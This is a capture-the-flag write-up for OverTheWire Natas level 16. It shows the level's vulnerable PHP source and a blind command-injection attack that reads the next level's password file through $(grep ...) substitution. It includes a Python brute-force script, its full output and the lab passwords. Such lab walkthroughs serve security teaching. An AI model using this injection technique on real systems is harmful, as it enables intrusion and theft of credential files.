# Natas Level 16
```bash
Username: natas16
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
URL:      http://natas16.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas16.png" />
    <div align="center">Natas 16</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas16-view-sourcecode.png" />
    <div align="center">Natas 16 - View sourcecode</div>
</figure>

And the script is (in first look it is similar to level 10):
```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/<strong>[;|&`\'"</strong>]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```

One difference from level 10 is few new illegal characters:
* ;
* |
* &amp;
* \`
* '
* "

The more important difference is that the $key is being qouted, so we can't send a filename to search in.

We know that the word "university" can be found in the dictionary, but no another word with the postfix "university".

We can again use the same technique ( blind code injection).

We brute force the password and prepend the search result to the word university, if the result word cant be found, we know that we are in the right way.

Using this python code:
```python
import requests
import string

URL = "http://natas16.natas.labs.overthewire.org/?needle=$(grep ^%s /etc/natas_webpass/natas17)university"
auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password = ''
c = string.digits + string.ascii_uppercase + string.ascii_lowercase

while len(password) < 32:
    for d in c:
        r = requests.get(URL % (password + d), auth=auth)

        if not "university" in r.content:
            password += d
            print password + "*" * (32 - len(password))
            break

print "Password for natas17 is:", password
```

We get the result:
```bash
8Ps*****************************
8Ps3****************************
8Ps3H***************************
8Ps3H0**************************
8Ps3H0G*************************
8Ps3H0GW************************
8Ps3H0GWb***********************
8Ps3H0GWbn**********************
8Ps3H0GWbn5*********************
8Ps3H0GWbn5r********************
8Ps3H0GWbn5rd*******************
8Ps3H0GWbn5rd9******************
8Ps3H0GWbn5rd9S*****************
8Ps3H0GWbn5rd9S7****************
8Ps3H0GWbn5rd9S7G***************
8Ps3H0GWbn5rd9S7Gm**************
8Ps3H0GWbn5rd9S7GmA*************
8Ps3H0GWbn5rd9S7GmAd************
8Ps3H0GWbn5rd9S7GmAdg***********
8Ps3H0GWbn5rd9S7GmAdgQ**********
8Ps3H0GWbn5rd9S7GmAdgQN*********
8Ps3H0GWbn5rd9S7GmAdgQNd********
8Ps3H0GWbn5rd9S7GmAdgQNdk*******
8Ps3H0GWbn5rd9S7GmAdgQNdkh******
8Ps3H0GWbn5rd9S7GmAdgQNdkhP*****
8Ps3H0GWbn5rd9S7GmAdgQNdkhPk****
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq***
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9**
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c*
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
Password for natas17 is: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

We got the password for the next level: **8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw**